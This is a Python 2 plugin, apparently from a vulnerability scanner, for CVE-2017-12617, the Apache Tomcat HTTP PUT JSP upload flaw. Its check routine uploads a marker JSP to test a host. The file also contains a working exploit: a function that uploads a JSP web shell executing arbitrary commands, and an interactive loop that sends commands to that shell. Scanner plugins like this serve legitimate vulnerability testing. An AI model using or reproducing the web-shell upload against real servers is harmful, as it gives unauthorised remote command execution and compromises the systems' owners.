#coding:utf-8
#!/usr/bin/python
import requests
import re
import signal

def get_plugin_info():
    plugin_info = {
        "name": "CVE-2017-12617 Apache Tomcat远程代码执行漏洞",
        "info": "CVE-2017-12617 Apache Tomcat启用HTTP PUT后，攻击者通过构造的请求，可上传任意JSP文件到服务器，造成远程代码执行。",
        "level": "高危",
        "type": "代码执行",
        "author": "郭驰",
        "url": "http://www.nsfocus.com.cn/content/details_141_2597.html",
        "keyword": "tag:tomcat",
        "source": 1
    }
    return plugin_info

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def signal_handler(signal, frame):

    print ("\033[91m"+"\n[-] Exiting"+"\033[0m")

    exit()

signal.signal(signal.SIGINT, signal_handler)




def removetags(tags):
  remove = re.compile('<.*?>')
  txt = re.sub(remove, '\n', tags)
  return txt.replace("\n\n\n","\n")


def getContent(url,f):
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    re=requests.get(str(url)+"/"+str(f), headers=headers)
    return re.content

def createPayload(url,f):
    evil='<% out.println("AAAAAAAAAAAAAAAAAAAAAAAAAAAAA");%>'
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    req=requests.put(str(url)+str(f)+"/",data=evil, headers=headers)
    if req.status_code==201:
        print "File Created .."

   
def RCE(url,f):
    EVIL="""<FORM METHOD=GET ACTION='{}'>""".format(f)+"""
    <INPUT name='cmd' type=text>
    <INPUT type=submit value='Run'>
    </FORM>
    <%@ page import="java.io.*" %>
    <%
   String cmd = request.getParameter("cmd");
   String output = "";
   if(cmd != null) {
      String s = null;
      try {
         Process p = Runtime.getRuntime().exec(cmd,null,null);
         BufferedReader sI = new BufferedReader(new
InputStreamReader(p.getInputStream()));
         while((s = sI.readLine()) != null) { output += s+"</br>"; }
      }  catch(IOException e) {   e.printStackTrace();   }
   }
%>
<pre><%=output %></pre>"""


    
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
    
    req=requests.put(str(url)+f+"/",data=EVIL, headers=headers)
    


def shell(url,f):
    
    while True:
        headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36'}
        cmd=raw_input("$ ")
        payload={'cmd':cmd}
        if cmd=="q" or cmd=="Q":
                break
        
        re=requests.get(str(url)+"/"+str(f),params=payload,headers=headers)
        re=str(re.content)
        t=removetags(re)
        print t

def check(ip, port, timeout):
    #exploit mode:port=pwn
    port=None
    
    if ip==None and port==None:
        #print(parse.usage)
        exit(0)

    else:
        if ip!=None and port==None:
    	    url=str('http://'+ip)
    	    checker="Poc.jsp"
    	    #print bcolors.BOLD +"Poc Filename  {}".format(checker)
    	    createPayload(str(url)+"/",checker)
    	    con=getContent(str(url)+"/",checker)
    	    if 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA' in con:
                #print bcolors.WARNING+url+' it\'s Vulnerable to CVE-2017-12617'+bcolors.ENDC
                return u'存在CVE-2017-12617漏洞'
                #print bcolors.WARNING+url+"/"+checker+bcolors.ENDC
            else:
                print 'Not Vulnerable to CVE-2017-12617 '

#check('10.1.5.25', 80, 0)